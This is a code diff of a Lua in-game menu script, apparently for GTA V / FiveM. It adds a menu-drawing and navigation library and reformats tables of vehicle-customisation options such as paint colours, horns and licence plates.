-        name = '~h~Plaques',
+        name = "~h~Plaques",
         id = 35
     },
     {
-        name = '~h~Speakers',
+        name = "~h~Speakers",
         id = 36
     },
     {
-        name = '~h~Trunk',
+        name = "~h~Trunk",
         id = 37
     },
     {
-        name = '~h~Hydraulics',
+        name = "~h~Hydraulics",
         id = 38
     },
     {
-        name = '~h~Engine Block',
+        name = "~h~Engine Block",
         id = 39
     },
     {
-        name = '~h~Air Filter',
+        name = "~h~Air Filter",
         id = 40
     },
     {
-        name = '~h~Struts',
+        name = "~h~Struts",
         id = 41
     },
     {
-        name = '~h~Arch Cover',
+        name = "~h~Arch Cover",
         id = 42
     },
     {
-        name = '~h~Aerials',
+        name = "~h~Aerials",
         id = 43
     },
     {
-        name = '~h~Trim 2',
+        name = "~h~Trim 2",
         id = 44
     },
     {
-        name = '~h~Tank',
+        name = "~h~Tank",
         id = 45
     },
     {
-        name = '~h~Windows',
+        name = "~h~Windows",
         id = 46
     },
     {
-        name = '~h~Livery',
+        name = "~h~Livery",
         id = 48
     },
     {
-        name = '~h~Horns',
+        name = "~h~Horns",
         id = 14
     },
     {
-        name = '~h~Wheels',
+        name = "~h~Wheels",
         id = 23
     },
     {
-        name = '~h~Wheel Types',
-        id = 'wheeltypes'
+        name = "~h~Wheel Types",
+        id = "wheeltypes"
     },
     {
-        name = '~h~Extras',
-        id = 'extra'
+        name = "~h~Extras",
+        id = "extra"
     },
     {
-        name = '~h~Neons',
-        id = 'neon'
+        name = "~h~Neons",
+        id = "neon"
     },
     {
-        name = '~h~Paint',
-        id = 'paint'
+        name = "~h~Paint",
+        id = "paint"
     },
     {
-        name = '~h~Headlights Color',
-        id = 'headlight'
+        name = "~h~Headlights Color",
+        id = "headlight"
     },
     {
-        name = '~h~Licence Plate',
-        id = 'licence'
+        name = "~h~Licence Plate",
+        id = "licence"
     }
 }
+
+
+local function setMenuVisible(id, visible, holdCurrent)
+    if id and menus[id] then
+        setMenuProperty(id, "visible", visible)
+
+        if not holdCurrent and menus[id] then
+            setMenuProperty(id, "currentOption", 1)
+        end
+
+        if visible then
+            if id ~= currentMenu and isMenuVisible(currentMenu) then
+                setMenuVisible(currentMenu, false)
+            end
+
+            currentMenu = id
+        end
+    end
+end
+
+
+local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
+    SetTextColour(color.r, color.g, color.b, color.a)
+    SetTextFont(font)
+    SetTextScale(scale, scale)
+
+    if shadow then
+        SetTextDropShadow(2, 2, 0, 0, 0)
+    end
+
+    if menus[currentMenu] then
+        if center then
+            SetTextCentre(center)
+        elseif alignRight then
+            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
+            SetTextRightJustify(true)
+        end
+    end
+
+    BeginTextCommandDisplayText("STRING")
+    AddTextComponentSubstringPlayerName(text)
+    EndTextCommandDisplayText(x, y)
+end
+
+
+local function drawRect(x, y, width, height, color)
+    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
+end
+
+
+local function drawTitle()
+    if menus[currentMenu] then
+        local x = menus[currentMenu].x + menus[currentMenu].width / 2
+        local y = menus[currentMenu].y + titleHeight / 2
+
+        if menus[currentMenu].titleBackgroundSprite then
+            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
+        else
+            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
+        end
+
+        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
+    end
+end
+
+
+local function drawSubTitle()
+    if menus[currentMenu] then
+        local x = menus[currentMenu].x + menus[currentMenu].width / 2
+        local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
+
+        local subTitleColor = { r = 255, g = 255, b = 255, a = 0 }
+
+        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
+        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)
+
+        if optionCount > menus[currentMenu].maxOptionCount then
+            drawText(tostring(menus[currentMenu].currentOption).." / "..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
+        end
+    end
+end
+
+
+local function drawButton(text, subText)
+    local x = menus[currentMenu].x + menus[currentMenu].width / 2
+    local multiplier = nil
+
+    if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
+        multiplier = optionCount
+    elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
+        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
+    end
+
+    if multiplier then
+        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
+        local backgroundColor = nil
+        local textColor = nil
+        local subTextColor = nil
+        local shadow = false
+
+        if menus[currentMenu].currentOption == optionCount then
+            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
+            textColor = menus[currentMenu].menuFocusTextColor
+            subTextColor = menus[currentMenu].menuFocusTextColor
+        else
+            backgroundColor = menus[currentMenu].menuBackgroundColor
+            textColor = menus[currentMenu].menuTextColor
+            subTextColor = menus[currentMenu].menuSubTextColor
+            shadow = true
+        end
+
+        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
+        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)
+
+        if subText then
+            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
+        end
+    end
+end
+
+
+function BrutanPremium.CreateMenu(id, title)
+    menus[id] = { }
+    menus[id].title = title
+
+    menus[id].visible = false
+
+    menus[id].previousMenu = nil
+
+    menus[id].aboutToBeClosed = false
+
+    menus[id].x = 0.75
+    menus[id].y = 0.1
+    menus[id].width = 0.225
+
+    menus[id].currentOption = 1
+    menus[id].maxOptionCount = 13
+
+    menus[id].titleFont = 1
+    menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
+    menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
+    menus[id].titleBackgroundSprite = nil
+
+    menus[id].menuTextColor = { r = 0, g = 0, b = 0, a = 255 }
+    menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
+    menus[id].menuFocusTextColor = { r = 0, g = 0, b = 0, a = 255 }
+    menus[id].menuFocusBackgroundColor = { r = 255, g = 255, b = 255, a = 180 }
+    menus[id].menuBackgroundColor = { r = 5, g = 160, b = 1, a = 125 }
+
+    menus[id].subTitleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
+
+    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" }
+
+    debugPrint(tostring(id).." menu created")
+end
+
+
+function BrutanPremium.CreateSubMenu(id, parent, subTitle)
+    if menus[parent] then
+        BrutanPremium.CreateMenu(id, menus[parent].title)
+
+        if subTitle then
+            setMenuProperty(id, "subTitle", string.upper(subTitle))
+        else
+            setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
+        end
+
+        setMenuProperty(id, "previousMenu", parent)
+
+        setMenuProperty(id, "x", menus[parent].x)
+        setMenuProperty(id, "y", menus[parent].y)
+        setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
+        setMenuProperty(id, "titleFont", menus[parent].titleFont)
+        setMenuProperty(id, "titleColor", menus[parent].titleColor)
+        setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
+        setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
+        setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
+        setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
+        setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
+        setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
+        setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
+        setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
+    else
+        debugPrint("Failed to create "..tostring(id).." submenu: "..tostring(parent).." parent menu doesn\"t exist")
+    end
+end
+
+
+function BrutanPremium.CurrentMenu()
+    return currentMenu
+end
+
+
+function trynaskidhuh(id)
+    if id and menus[id] then
+        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+        setMenuVisible(id, true)
+        debugPrint(tostring(id).." menu opened")
+    else
+        debugPrint("Failed to open "..tostring(id).." menu: it doesn\"t exist")
+    end
+end
+
+
+function BrutanPremium.IsMenuOpened(id)
+    return isMenuVisible(id)
+end
+
+
+function BrutanPremium.IsAnyMenuOpened()
+    for id, _ in pairs(menus) do
+        if isMenuVisible(id) then return true end
+    end
+
+    return false
+end
+
+
+function BrutanPremium.IsMenuAboutToBeClosed()
+    if menus[currentMenu] then
+        return menus[currentMenu].aboutToBeClosed
+    else
+        return false
+    end
+end
+
+
+function BrutanPremium.CloseMenu()
+    if menus[currentMenu] then
+        if menus[currentMenu].aboutToBeClosed then
+            menus[currentMenu].aboutToBeClosed = false
+            setMenuVisible(currentMenu, false)
+            debugPrint(tostring(currentMenu).." menu closed")
+            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+            optionCount = 0
+            currentMenu = nil
+            currentKey = nil
+        else
+            menus[currentMenu].aboutToBeClosed = true
+            debugPrint(tostring(currentMenu).." menu about to be closed")
+        end
+    end
+end
+
+
+function BrutanPremium.Button(text, subText)
+    local buttonText = text
+    if subText then
+        buttonText = "{ "..tostring(buttonText)..", "..tostring(subText).." }"
+    end
+
+    if menus[currentMenu] then
+        optionCount = optionCount + 1
+
+        local isCurrent = menus[currentMenu].currentOption == optionCount
+
+        drawButton(text, subText)
+
+        if isCurrent then
+            if currentKey == keys.select then
+                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
+                debugPrint(buttonText.." button pressed")
+                return true
+            elseif currentKey == keys.left or currentKey == keys.right then
+                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+            end
+        end
+
+        return false
+    else
+        debugPrint("Failed to create "..buttonText.." button: "..tostring(currentMenu).." menu doesn\"t exist")
+
+        return false
+    end
+end
+
+
+function BrutanPremium.MenuButton(text, id)
+    if menus[id] then
+        if BrutanPremium.Button(text) then
+            setMenuVisible(currentMenu, false)
+            setMenuVisible(id, true, true)
+
+            return true
+        end
+    else
+        debugPrint("Failed to create "..tostring(text).." menu button: "..tostring(id).." submenu doesn\"t exist")
+    end
+
+    return false
+end
+
 local bm = {
     {
-        name = '~h~Engine',
+        name = "~h~~r~Engine",
         id = 11
     },
     {
-        name = '~h~~b~Brakes',
+        name = "~h~~b~Brakes",
         id = 12
     },
     {
-        name = '~h~Transmission',
+        name = "~h~~g~Transmission",
         id = 13
     },
     {
-        name = '~h~~y~Suspension',
+        name = "~h~~y~Suspension",
         id = 15
     },
     {
-        name = '~h~~b~Armor',
+        name = "~h~~b~Armor",
         id = 16
     }
 }
-local bn = {
+
+function BrutanPremium.CheckBox(text, checked, callback)
+    if BrutanPremium.Button(text, checked and "~g~~h~On" or "~h~~c~Off") then
+        checked = not checked
+        debugPrint(tostring(text).." checkbox changed to "..tostring(checked))
+        if callback then callback(checked) end
+
+        return true
+    end
+
+    return false
+end
+
+
+function BrutanPremium.ComboBox(text, items, currentIndex, selectedIndex, callback)
+    local itemsCount = #items
+    local selectedItem = items[currentIndex]
+    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
+
+    if itemsCount > 1 and isCurrent then
+        selectedItem = "← "..tostring(selectedItem).." →"
+    end
+
+    if BrutanPremium.Button(text, selectedItem) then
+        selectedIndex = currentIndex
+        callback(currentIndex, selectedIndex)
+        return true
+    elseif isCurrent then
+        if currentKey == keys.left then
+            if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
+        elseif currentKey == keys.right then
+            if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
+        end
+    else
+        currentIndex = selectedIndex
+    end
+
+    callback(currentIndex, selectedIndex)
+    return false
+end
+
+function BrutanPremium.Display()
+    if isMenuVisible(currentMenu) then
+        if menus[currentMenu].aboutToBeClosed then
+            BrutanPremium.CloseMenu()
+        else
+            ClearAllHelpMessages()
+
+            drawTitle()
+            drawSubTitle()
+
+            currentKey = nil
+
+            if IsControlJustReleased(1, keys.down) then
+                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+
+                if menus[currentMenu].currentOption < optionCount then
+                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
+                else
+                    menus[currentMenu].currentOption = 1
+                end
+            elseif IsControlJustReleased(1, keys.up) then
+                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+
+                if menus[currentMenu].currentOption > 1 then
+                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
+                else
+                    menus[currentMenu].currentOption = optionCount
+                end
+            elseif IsControlJustReleased(1, keys.left) then
+                currentKey = keys.left
+            elseif IsControlJustReleased(1, keys.right) then
+                currentKey = keys.right
+            elseif IsControlJustReleased(1, keys.select) then
+                currentKey = keys.select
+            elseif IsControlJustReleased(1, keys.back) then
+                if menus[menus[currentMenu].previousMenu] then
+                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+                    setMenuVisible(menus[currentMenu].previousMenu, true)
+                else
+                    BrutanPremium.CloseMenu()
+                end
+            end
+
+            optionCount = 0
+        end
+    end
+end
+
+
+function BrutanPremium.SetMenuWidth(id, width)
+    setMenuProperty(id, "width", width)
+end
+
+
+function BrutanPremium.SetMenuX(id, x)
+    setMenuProperty(id, "x", x)
+end
+
+
+function BrutanPremium.SetMenuY(id, y)
+    setMenuProperty(id, "y", y)
+end
+
+
+function BrutanPremium.SetMenuMaxOptionCountOnScreen(id, count)
+    setMenuProperty(id, "maxOptionCount", count)
+end
+
+
+function BrutanPremium.SetTitle(id, title)
+    setMenuProperty(id, "title", title)
+end
+
+
+function BrutanPremium.SetTitleColor(id, r, g, b, a)
+    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
+end
+
+
+function BrutanPremium.SetTitleBackgroundColor(id, r, g, b, a)
+    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
+end
+
+
+function BrutanPremium.SetTitleBackgroundSprite(id, textureDict, textureName)
+    RequestStreamedTextureDict(textureDict)
+    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
+end
+
+
+function BrutanPremium.SetSubTitle(id, text)
+    setMenuProperty(id, "subTitle", string.upper(text))
+end
+
+
+function BrutanPremium.SetMenuBackgroundColor(id, r, g, b, a)
+    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
+end
+
+
+function BrutanPremium.SetMenuTextColor(id, r, g, b, a)
+    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
+end
+
+function BrutanPremium.SetMenuSubTextColor(id, r, g, b, a)
+    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
+end
+
+function BrutanPremium.SetMenuFocusColor(id, r, g, b, a)
+    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
+end
+
+
+function BrutanPremium.SetMenuButtonPressedSound(id, name, set)
+    setMenuProperty(id, "buttonPressedSound", { ["name"] = name, ["set"] = set })
+end
+
+function drawNotification(text)
+    SetNotificationTextEntry("STRING")
+    AddTextComponentString(text)
+    DrawNotification(false, false)
+end
+
+
+function getEntity(player)
+    local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
+    return entity
+end
+
+local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
+    SetTextFont(0)
+    SetTextProportional(1)
+    SetTextScale(0.0,0.4)
+    SetTextDropshadow(1,0,0,0,255)
+    SetTextEdge(1,0,0,0,255)
+    SetTextDropShadow()
+    SetTextOutline()
+    SetTextEntry("STRING")
+    AddTextComponentString(u)
+    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
+ end
+
+ local bn = {
     {
-        name = '~h~Blue on White 2',
+        name = "~h~Blue on White 2",
         id = 0
     },
     {
-        name = '~h~Blue on White 3',
+        name = "~h~Blue on White 3",
         id = 4
     },
     {
-        name = '~h~Yellow on Blue',
+        name = "~h~Yellow on Blue",
         id = 2
     },
     {
-        name = '~h~Yellow on Black',
+        name = "~h~Yellow on Black",
         id = 1
     },
     {
-        name = '~h~North Yankton',
+        name = "~h~North Yankton",
         id = 5
     }
 }
-local bo = {
-    {
-        name = '~h~Default',
-        id = -1
-    },
-    {
-        name = '~h~White',
-        id = 0
-    },
-    {
-        name = '~h~Blue',
-        id = 1
-    },
-    {
-        name = '~h~Electric Blue',
-        id = 2
-    },
-    {
-        name = '~h~Mint Green',
-        id = 3
-    },
-    {
-        name = '~h~Lime Green',
-        id = 4
-    },
-    {
-        name = '~h~Yellow',
-        id = 5
-    },
-    {
-        name = '~h~Golden Shower',
-        id = 6
-    },
-    {
-        name = '~h~Orange',
-        id = 7
-    },
-    {
-        name = '~h~Red',
-        id = 8
-    },
-    {
-        name = '~h~Pony Pink',
-        id = 9
-    },
-    {
-        name = '~h~Hot Pink',
-        id = 10
-    },
-    {
-        name = '~h~Purple',
-        id = 11
-    },
-    {
-        name = '~h~Blacklight',
-        id = 12
-    }
-}
+
 local bp = {
-    ['Stock Horn'] = -1,
-    ['Truck Horn'] = 1,
-    ['Police Horn'] = 2,
-    ['Clown Horn'] = 3,
-    ['Musical Horn 1'] = 4,
-    ['Musical Horn 2'] = 5,
-    ['Musical Horn 3'] = 6,
-    ['Musical Horn 4'] = 7,
-    ['Musical Horn 5'] = 8,
-    ['Sad Trombone Horn'] = 9,
-    ['Classical Horn 1'] = 10,
-    ['Classical Horn 2'] = 11,
-    ['Classical Horn 3'] = 12,
-    ['Classical Horn 4'] = 13,
-    ['Classical Horn 5'] = 14,
-    ['Classical Horn 6'] = 15,
-    ['Classical Horn 7'] = 16,
-    ['Scaledo Horn'] = 17,
-    ['Scalere Horn'] = 18,
-    ['Salemi Horn'] = 19,
-    ['Scalefa Horn'] = 20,
-    ['Scalesol Horn'] = 21,
-    ['Scalela Horn'] = 22,
-    ['Scaleti Horn'] = 23,
-    ['Scaledo Horn High'] = 24,
-    ['Jazz Horn 1'] = 25,
-    ['Jazz Horn 2'] = 26,
-    ['Jazz Horn 3'] = 27,
-    ['Jazz Loop Horn'] = 28,
-    ['Starspangban Horn 1'] = 28,
-    ['Starspangban Horn 2'] = 29,
-    ['Starspangban Horn 3'] = 30,
-    ['Starspangban Horn 4'] = 31,
-    ['Classical Loop 1'] = 32,
-    ['Classical Horn 8'] = 33,
-    ['Classical Loop 2'] = 34
+    ["Stock Horn"] = -1,
+    ["Truck Horn"] = 1,
+    ["Police Horn"] = 2,
+    ["Clown Horn"] = 3,
+    ["Musical Horn 1"] = 4,
+    ["Musical Horn 2"] = 5,
+    ["Musical Horn 3"] = 6,
+    ["Musical Horn 4"] = 7,
+    ["Musical Horn 5"] = 8,
+    ["Sad Trombone Horn"] = 9,
+    ["Classical Horn 1"] = 10,
+    ["Classical Horn 2"] = 11,
+    ["Classical Horn 3"] = 12,
+    ["Classical Horn 4"] = 13,
+    ["Classical Horn 5"] = 14,
+    ["Classical Horn 6"] = 15,
+    ["Classical Horn 7"] = 16,
+    ["Scaledo Horn"] = 17,
+    ["Scalere Horn"] = 18,
+    ["Salemi Horn"] = 19,
+    ["Scalefa Horn"] = 20,
+    ["Scalesol Horn"] = 21,
+    ["Scalela Horn"] = 22,
+    ["Scaleti Horn"] = 23,
+    ["Scaledo Horn High"] = 24,
+    ["Jazz Horn 1"] = 25,
+    ["Jazz Horn 2"] = 26,
+    ["Jazz Horn 3"] = 27,
+    ["Jazz Loop Horn"] = 28,
+    ["Starspangban Horn 1"] = 28,
+    ["Starspangban Horn 2"] = 29,
+    ["Starspangban Horn 3"] = 30,
+    ["Starspangban Horn 4"] = 31,
+    ["Classical Loop 1"] = 32,
+    ["Classical Horn 8"] = 33,
+    ["Classical Loop 2"] = 34
 }
 local bq = {
-    ['White'] = {
+    ["White"] = {
         255,
         255,
         255
     },
-    ['Blue'] = {
+    ["Blue"] = {
         0,
         0,
         255
     },
-    ['Electric Blue'] = {
+    ["Electric Blue"] = {
         0,
         150,
         255
     },
-    ['Mint Green'] = {
+    ["Mint Green"] = {
         50,
         255,
         155
     },
-    ['Lime Green'] = {
+    ["Lime Green"] = {
         0,
         255,
         0
     },
-    ['Yellow'] = {
+    ["Yellow"] = {
         255,
         255,
         0
     },
-    ['Golden Shower'] = {
+    ["Golden Shower"] = {
         204,
         204,
         0
     },
-    ['Orange'] = {
+    ["Orange"] = {
         255,
         128,
         0
     },
-    ['Red'] = {
+    ["Red"] = {
         255,
         0,
         0
     },
-    ['Pony Pink'] = {
+    ["Pony Pink"] = {
         255,
         102,
         255
     },
-    ['Hot Pink'] = {
+    ["Hot Pink"] = {
         255,
         0,
         255
     },
-    ['Purple'] = {
+    ["Purple"] = {
         153,
         0,
         153
     }
 }
+
+
 local br = {
     {
-        name = '~h~Black',
+        name = "~h~Black",
         id = 0
     },
     {
-        name = '~h~Carbon Black',
+        name = "~h~Carbon Black",
         id = 147
     },
     {
-        name = '~h~Graphite',
+        name = "~h~Graphite",
         id = 1
     },
     {
-        name = '~h~Anhracite Black',
+        name = "~h~Anhracite Black",
         id = 11
     },
     {
-        name = '~h~Black Steel',
+        name = "~h~Black Steel",
         id = 2
     },
     {
-        name = '~h~Dark Steel',
+        name = "~h~Dark Steel",
         id = 3
     },
     {
-        name = '~h~Silver',
+        name = "~h~Silver",
         id = 4
     },
     {
-        name = '~h~Bluish Silver',
+        name = "~h~Bluish Silver",
         id = 5
     },
     {
-        name = '~h~Rolled Steel',
+        name = "~h~Rolled Steel",
         id = 6
     },
     {
-        name = '~h~Shadow Silver',
+        name = "~h~Shadow Silver",
         id = 7
     },
     {
-        name = '~h~Stone Silver',
+        name = "~h~Stone Silver",
         id = 8
     },
     {
-        name = '~h~Midnight Silver',
+        name = "~h~Midnight Silver",
         id = 9
     },
     {
-        name = '~h~Cast Iron Silver',
+        name = "~h~Cast Iron Silver",
         id = 10
     },
     {
-        name = '~h~Red',
+        name = "~h~Red",
         id = 27
     },
     {
-        name = '~h~Torino Red',
+        name = "~h~Torino Red",
         id = 28
     },
     {
-        name = '~h~Formula Red',
+        name = "~h~Formula Red",
         id = 29
     },
     {
-        name = '~h~Lava Red',
+        name = "~h~Lava Red",
         id = 150
     },
     {
-        name = '~h~Blaze Red',
+        name = "~h~Blaze Red",
         id = 30
     },
     {
-        name = '~h~Grace Red',
+        name = "~h~Grace Red",
         id = 31
     },
     {
-        name = '~h~Garnet Red',
+        name = "~h~Garnet Red",
         id = 32
     },
     {
-        name = '~h~Sunset Red',
+        name = "~h~Sunset Red",
         id = 33
     },
     {
-        name = '~h~Cabernet Red',
+        name = "~h~Cabernet Red",
         id = 34
     },
     {
-        name = '~h~Wine Red',
+        name = "~h~Wine Red",
         id = 143
     },
     {
-        name = '~h~Candy Red',
+        name = "~h~Candy Red",
         id = 35
     },
     {
-        name = '~h~Hot Pink',
+        name = "~h~Hot Pink",
         id = 135
     },
     {
-        name = '~h~Pfsiter Pink',
+        name = "~h~Pfsiter Pink",
         id = 137
     },
     {
-        name = '~h~Salmon Pink',
+        name = "~h~Salmon Pink",
         id = 136
     },
     {
-        name = '~h~Sunrise Orange',
+        name = "~h~Sunrise Orange",
         id = 36
     },
     {
-        name = '~h~Orange',
+        name = "~h~Orange",
         id = 38
     },
     {
-        name = '~h~Bright Orange',
+        name = "~h~Bright Orange",
         id = 138
     },
     {
-        name = '~h~Gold',
+        name = "~h~Gold",
         id = 99
     },
     {
-        name = '~h~Bronze',
+        name = "~h~Bronze",
         id = 90
     },
     {
-        name = '~h~Yellow',
+        name = "~h~Yellow",
         id = 88
     },
     {
-        name = '~h~Race Yellow',
+        name = "~h~Race Yellow",
         id = 89
     },
     {
-        name = '~h~Dew Yellow',
+        name = "~h~Dew Yellow",
         id = 91
     },
     {
-        name = '~h~Dark Green',
+        name = "~h~Dark Green",
         id = 49
     },
     {
-        name = '~h~Racing Green',
+        name = "~h~Racing Green",
         id = 50
     },
     {
-        name = '~h~Sea Green',
+        name = "~h~Sea Green",
         id = 51
     },
     {
-        name = '~h~Olive Green',
+        name = "~h~Olive Green",
         id = 52
     },
     {
-        name = '~h~Bright Green',
+        name = "~h~Bright Green",
         id = 53
     },
     {
-        name = '~h~Gasoline Green',
+        name = "~h~Gasoline Green",
         id = 54
     },
     {
-        name = '~h~Lime Green',
+        name = "~h~Lime Green",
         id = 92
     },
     {
-        name = '~h~Midnight Blue',
+        name = "~h~Midnight Blue",
         id = 141
     },
     {
-        name = '~h~Galaxy Blue',
+        name = "~h~Galaxy Blue",
         id = 61
     },
     {
-        name = '~h~Dark Blue',
+        name = "~h~Dark Blue",
         id = 62
     },
     {
-        name = '~h~Saxon Blue',
+        name = "~h~Saxon Blue",
         id = 63
     },
     {
-        name = '~h~Blue',
+        name = "~h~Blue",
         id = 64
     },
     {
-        name = '~h~Mariner Blue',
+        name = "~h~Mariner Blue",
         id = 65
     },
     {
-        name = '~h~Harbor Blue',
+        name = "~h~Harbor Blue",
         id = 66
     },
     {
-        name = '~h~Diamond Blue',
+        name = "~h~Diamond Blue",
         id = 67
     },
     {
-        name = '~h~Surf Blue',
+        name = "~h~Surf Blue",
         id = 68
     },
     {
-        name = '~h~Nautical Blue',
+        name = "~h~Nautical Blue",
         id = 69
     },
     {
-        name = '~h~Racing Blue',
+        name = "~h~Racing Blue",
         id = 73
     },
     {
-        name = '~h~Ultra Blue',
+        name = "~h~Ultra Blue",
         id = 70
     },
     {
-        name = '~h~Light Blue',
+        name = "~h~Light Blue",
         id = 74
     },
     {
-        name = '~h~Chocolate Brown',
+        name = "~h~Chocolate Brown",
         id = 96
     },
     {
-        name = '~h~Bison Brown',
+        name = "~h~Bison Brown",
         id = 101
     },
     {
-        name = '~h~Creeen Brown',
+        name = "~h~Creeen Brown",
         id = 95
     },
     {
-        name = '~h~Feltzer Brown',
+        name = "~h~Feltzer Brown",
         id = 94
     },
     {
-        name = '~h~Maple Brown',
+        name = "~h~Maple Brown",
         id = 97
     },
     {
-        name = '~h~Beechwood Brown',
+        name = "~h~Beechwood Brown",
         id = 103
     },
     {
-        name = '~h~Sienna Brown',
+        name = "~h~Sienna Brown",
         id = 104
     },
     {
-        name = '~h~Saddle Brown',
+        name = "~h~Saddle Brown",
         id = 98
     },
     {
-        name = '~h~Moss Brown',
+        name = "~h~Moss Brown",
         id = 100
     },
     {
-        name = '~h~Woodbeech Brown',
+        name = "~h~Woodbeech Brown",
         id = 102
     },
     {
-        name = '~h~Straw Brown',
+        name = "~h~Straw Brown",
         id = 99
     },
     {
-        name = '~h~Sandy Brown',
+        name = "~h~Sandy Brown",
         id = 105
     },
     {
-        name = '~h~Bleached Brown',
+        name = "~h~Bleached Brown",
         id = 106
     },
     {
-        name = '~h~Schafter Purple',
+        name = "~h~Schafter Purple",
         id = 71
     },
     {
-        name = '~h~Spinnaker Purple',
+        name = "~h~Spinnaker Purple",
         id = 72
     },
     {
-        name = '~h~Midnight Purple',
+        name = "~h~Midnight Purple",
         id = 142
     },
     {
-        name = '~h~Bright Purple',
+        name = "~h~Bright Purple",
         id = 145
     },
     {
-        name = '~h~Cream',
+        name = "~h~Cream",
         id = 107
     },
     {
-        name = '~h~Ice White',
+        name = "~h~Ice White",
         id = 111
     },
     {
-        name = '~h~Frost White',
+        name = "~h~Frost White",
         id = 112
     }
 }
 local bt = {
     {
-        name = '~h~Black',
+        name = "~h~Black",
         id = 12
     },
     {
-        name = '~h~Gray',
+        name = "~h~Gray",
         id = 13
     },
     {
-        name = '~h~Light Gray',
+        name = "~h~Light Gray",
         id = 14
     },
     {
-        name = '~h~Ice White',
+        name = "~h~Ice White",
         id = 131
     },
     {
-        name = '~h~Blue',
+        name = "~h~Blue",
         id = 83
     },
     {
-        name = '~h~Dark Blue',
+        name = "~h~Dark Blue",
         id = 82
     },
     {
-        name = '~h~Midnight Blue',
+        name = "~h~Midnight Blue",
         id = 84
     },
     {
-        name = '~h~Midnight Purple',
+        name = "~h~Midnight Purple",
         id = 149
